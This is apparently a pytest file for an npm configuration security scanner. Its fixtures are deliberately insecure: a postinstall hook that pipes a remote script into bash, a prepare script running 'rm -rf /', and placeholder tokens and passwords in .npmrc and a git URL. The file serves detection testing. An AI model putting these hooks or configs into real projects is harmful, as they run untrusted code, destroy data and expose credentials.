"""Tests for NpmAnalyzer."""

from pathlib import Path

from devai.npm_analyzer import NpmAnalyzer, NpmFinding


INSECURE_PACKAGE_JSON = """\
{
  "name": "demo",
  "version": "1.0.0",
  "dependencies": {
    "lodash": "*",
    "bad-lib": "git+https://user:secret-token@github.com/example/bad-lib.git#main"
  },
  "scripts": {
    "postinstall": "curl -s https://install.example.com/script.sh | bash",
    "prepare": "rm -rf / && chmod 777 /tmp"
  }
}
"""

INSECURE_NPMRC = """\
registry=http://insecure-registry.example.com/
//registry.npmjs.org/:_authToken=npm_hardcoded_token_abcdefghijklmnopqrstuvwxyz
strict-ssl=false
password=hardcoded-npm-password
"""

HARDENED_PACKAGE_JSON = """\
{
  "name": "demo",
  "version": "1.0.0",
  "dependencies": {
    "lodash": "4.17.21",
    "react": "18.2.0"
  },
  "devDependencies": {
    "typescript": "5.3.3"
  }
}
"""


class TestNpmAnalyzer:
    def test_no_configs_returns_perfect_score(self, tmp_path: Path):
        (tmp_path / "app.py").write_text("x = 1\n", encoding="utf-8")
        analyzer = NpmAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 0
        assert analyzer.health_score() == 100.0

    def test_detects_package_json(self, tmp_path: Path):
        (tmp_path / "package.json").write_text(HARDENED_PACKAGE_JSON, encoding="utf-8")
        (tmp_path / "package-lock.json").write_text("{}", encoding="utf-8")
        analyzer = NpmAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 1

    def test_detects_insecure_patterns(self, tmp_path: Path):
        (tmp_path / "package.json").write_text(INSECURE_PACKAGE_JSON, encoding="utf-8")
        (tmp_path / ".npmrc").write_text(INSECURE_NPMRC, encoding="utf-8")
        analyzer = NpmAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "npm_token" in kinds
        assert "insecure_http" in kinds
        assert "scm_credentials" in kinds
        assert "lifecycle_curl_pipe" in kinds
        assert "dangerous_script" in kinds
        assert "insecure_ssl" in kinds
        assert "unpinned_git_dep" in kinds
        assert "dynamic_version" in kinds
        assert analyzer.health_score() < 50.0

    def test_hardened_config_scores_well(self, tmp_path: Path):
        (tmp_path / "package.json").write_text(HARDENED_PACKAGE_JSON, encoding="utf-8")
        (tmp_path / "package-lock.json").write_text("{}", encoding="utf-8")
        analyzer = NpmAnalyzer(str(tmp_path))
        assert analyzer.health_score() >= 95.0

    def test_finding_format(self, tmp_path: Path):
        (tmp_path / "package.json").write_text(INSECURE_PACKAGE_JSON, encoding="utf-8")
        analyzer = NpmAnalyzer(str(tmp_path))
        finding = analyzer.analyze()[0]
        assert isinstance(finding, NpmFinding)
        assert "[high]" in finding.format() or "[medium]" in finding.format()

    def test_summary_and_context(self, tmp_path: Path):
        (tmp_path / "package.json").write_text(INSECURE_PACKAGE_JSON, encoding="utf-8")
        analyzer = NpmAnalyzer(str(tmp_path))
        assert "Npm configs: 1" in analyzer.summary()
        context = analyzer.to_context()
        assert "Npm analysis:" in context
        assert "dependencies:" in context

    def test_generate_hardened_config(self, tmp_path: Path):
        analyzer = NpmAnalyzer(str(tmp_path))
        config = analyzer.generate_hardened_config()
        assert ".npmrc" in config
        assert "NPM_TOKEN" in config

    def test_detects_missing_lockfile(self, tmp_path: Path):
        (tmp_path / "package.json").write_text(HARDENED_PACKAGE_JSON, encoding="utf-8")
        analyzer = NpmAnalyzer(str(tmp_path))
        kinds = {f.kind for f in analyzer.analyze()}
        assert "missing_lockfile" in kinds

    def test_npmrc_config(self, tmp_path: Path):
        (tmp_path / ".npmrc").write_text(INSECURE_NPMRC, encoding="utf-8")
        analyzer = NpmAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 1
